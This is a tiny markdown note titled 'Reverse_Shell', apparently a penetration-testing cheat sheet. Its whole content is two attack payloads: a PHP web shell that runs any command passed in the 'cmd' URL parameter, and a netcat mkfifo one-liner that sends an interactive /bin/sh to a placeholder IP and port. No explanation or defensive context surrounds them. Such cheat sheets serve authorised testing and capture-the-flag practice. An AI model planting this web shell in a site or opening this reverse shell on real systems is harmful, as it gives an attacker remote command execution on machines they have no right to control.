# Reverse\_Shell

```
<? php echo "<pre>"; system($_GET['cmd']); ?>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP_ADDR] [PORT] >/tmp/f
```
